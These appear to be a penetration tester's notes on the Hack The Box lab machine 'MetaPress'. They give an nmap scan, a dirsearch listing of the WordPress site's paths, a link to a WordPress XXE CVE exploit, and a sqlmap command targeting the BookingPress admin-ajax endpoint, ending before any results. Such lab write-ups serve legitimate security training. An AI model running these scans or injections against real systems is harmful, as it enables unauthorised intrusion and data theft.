Port Enumerate
```bash
nmap -sV 10.10.11.186
```

Result
![[Pasted image 20230315152947.png]]

Path Enumerate
```bash
dirsearch -u http://metapress.htb
```

Result
```txt
200   633B   http://metapress.htb:80/.htaccess
301     0B   http://metapress.htb:80/0    -> REDIRECTS TO: http://metapress.htb/0/
301     0B   http://metapress.htb:80/About    -> REDIRECTS TO: http://metapress.htb/about-us/
301     0B   http://metapress.htb:80/New%20folder%20(2)    -> REDIRECTS TO: http://metapress.htb/New%20folder%20(2
301     0B   http://metapress.htb:80/A    -> REDIRECTS TO: http://metapress.htb/about-us/
301     0B   http://metapress.htb:80/a    -> REDIRECTS TO: http://metapress.htb/about-us/
301     0B   http://metapress.htb:80/ab/    -> REDIRECTS TO: http://metapress.htb/about-us/
301     0B   http://metapress.htb:80/about    -> REDIRECTS TO: http://metapress.htb/about-us/
301     0B   http://metapress.htb:80/about-us    -> REDIRECTS TO: http://metapress.htb/about-us/
301     0B   http://metapress.htb:80/actuator/events    -> REDIRECTS TO: http://metapress.htb/events/
302     0B   http://metapress.htb:80/admin    -> REDIRECTS TO: http://metapress.htb/wp-admin/
301     0B   http://metapress.htb:80/admin.    -> REDIRECTS TO: http://metapress.htb/admin
302     0B   http://metapress.htb:80/admin/    -> REDIRECTS TO: http://metapress.htb/wp-admin/
301     0B   http://metapress.htb:80/asset..    -> REDIRECTS TO: http://metapress.htb/asset
301     0B   http://metapress.htb:80/atom    -> REDIRECTS TO: http://metapress.htb/feed/atom/
301     0B   http://metapress.htb:80/c    -> REDIRECTS TO: http://metapress.htb/cancel-appointment/
302     0B   http://metapress.htb:80/dashboard    -> REDIRECTS TO: http://metapress.htb/wp-admin/
301     0B   http://metapress.htb:80/e    -> REDIRECTS TO: http://metapress.htb/events/
301     0B   http://metapress.htb:80/engine/classes/swfupload//swfupload.swf    -> REDIRECTS TO: http://metapress.htb/engine/classes/swfupload/swfupload.swf
301     0B   http://metapress.htb:80/engine/classes/swfupload//swfupload_f9.swf    -> REDIRECTS TO: http://metapress.htb/engine/classes/swfupload/swfupload_f9.swf
301     0B   http://metapress.htb:80/events    -> REDIRECTS TO: http://metapress.htb/events/
301     0B   http://metapress.htb:80/extjs/resources//charts.swf    -> REDIRECTS TO: http://metapress.htb/extjs/resources/charts.swf
301     0B   http://metapress.htb:80/feed    -> REDIRECTS TO: http://metapress.htb/feed/
301     0B   http://metapress.htb:80/h    -> REDIRECTS TO: http://metapress.htb/hello-world/
301     0B   http://metapress.htb:80/hello    -> REDIRECTS TO: http://metapress.htb/hello-world/
301     0B   http://metapress.htb:80/html/js/misc/swfupload//swfupload.swf    -> REDIRECTS TO: http://metapress.htb/html/js/misc/swfupload/swfupload.swf
301     0B   http://metapress.htb:80/index.php    -> REDIRECTS TO: http://metapress.htb/
301     0B   http://metapress.htb:80/index.php/login/    -> REDIRECTS TO: http://metapress.htb/login/
200    19KB  http://metapress.htb:80/license.txt
302     0B   http://metapress.htb:80/login    -> REDIRECTS TO: http://metapress.htb/wp-login.php
302     0B   http://metapress.htb:80/login/    -> REDIRECTS TO: http://metapress.htb/wp-login.php
301     0B   http://metapress.htb:80/login.wdm%20    -> REDIRECTS TO: http://metapress.htb/login.wdm
301     0B   http://metapress.htb:80/login.wdm%2e    -> REDIRECTS TO: http://metapress.htb/login.wdm
301     0B   http://metapress.htb:80/phpmyadmin!!    -> REDIRECTS TO: http://metapress.htb/phpmyadmin
301     0B   http://metapress.htb:80/public..    -> REDIRECTS TO: http://metapress.htb/public
200     7KB  http://metapress.htb:80/readme.html
301     0B   http://metapress.htb:80/rating_over.    -> REDIRECTS TO: http://metapress.htb/rating_over
200   113B   http://metapress.htb:80/robots.txt
301     0B   http://metapress.htb:80/rss    -> REDIRECTS TO: http://metapress.htb/feed/
301     0B   http://metapress.htb:80/s    -> REDIRECTS TO: http://metapress.htb/sample-page/
301     0B   http://metapress.htb:80/sample    -> REDIRECTS TO: http://metapress.htb/sample-page/
301     0B   http://metapress.htb:80/servlet/hello    -> REDIRECTS TO: http://metapress.htb/hello-world/
302     0B   http://metapress.htb:80/sitemap.xml    -> REDIRECTS TO: http://metapress.htb/wp-sitemap.xml
301     0B   http://metapress.htb:80/static..    -> REDIRECTS TO: http://metapress.htb/static
301     0B   http://metapress.htb:80/t    -> REDIRECTS TO: http://metapress.htb/thank-you/
301   169B   http://metapress.htb:80/wp-admin    -> REDIRECTS TO: http://metapress.htb/wp-admin/
301   169B   http://metapress.htb:80/wp-content    -> REDIRECTS TO: http://metapress.htb/wp-content/
302     0B   http://metapress.htb:80/wp-admin/    -> REDIRECTS TO: http://metapress.htb/wp-login.php?redirect_to=http%3A%2F%2Fmetapress.htb%2Fwp-admin%2F&reauth=1
400     1B   http://metapress.htb:80/wp-admin/admin-ajax.php
409     3KB  http://metapress.htb:80/wp-admin/setup-config.php
200     1KB  http://metapress.htb:80/wp-admin/install.php
200     0B   http://metapress.htb:80/wp-config.php
200     0B   http://metapress.htb:80/wp-content/
403   555B   http://metapress.htb:80/wp-content/uploads/
403   555B   http://metapress.htb:80/wp-content/upgrade/
301   169B   http://metapress.htb:80/wp-includes    -> REDIRECTS TO: http://metapress.htb/wp-includes/
403   555B   http://metapress.htb:80/wp-includes/
200     0B   http://metapress.htb:80/wp-cron.php
200   578B   http://metapress.htb:80/wp-json/wp/v2/users/
200     0B   http://metapress.htb:80/wp-includes/rss-functions.php
302     0B   http://metapress.htb:80/wp-signup.php    -> REDIRECTS TO: http://metapress.htb/wp-login.php?action=register
200     7KB  http://metapress.htb:80/wp-login.php
200    91KB  http://metapress.htb:80/wp-json/
405    42B   http://metapress.htb:80/xmlrpc.php
```

Interested Path
- robots.txt
  ![[Pasted image 20230315160353.png]]

Wordpress  Scan

![[Pasted image 20230315160957.png]]

Search CVE of this version
[WordPress 5.6-5.7 - Authenticated (Author+) XXE (CVE-2021-29447)]([motikan2010/CVE-2021-29447: WordPress - Authenticated XXE (CVE-2021-29447) (github.com)](https://github.com/motikan2010/CVE-2021-29447))

/event (click on Event Button)

![[Pasted image 20230315162239.png]]

Copy Post Data
```txt
action=bookingpress_front_get_category_services&category_id=1&total_service=&_wpnonce=505bcb5390
```

Use Sqlmap For Injection
```bash
sqlmap -u http://metapress.htb/wp-admin/admin-ajax.php -data "action=bookingpress_front_get_category_services&category_id=1&total_service=1&_wpnonce=505bcb5390"
```
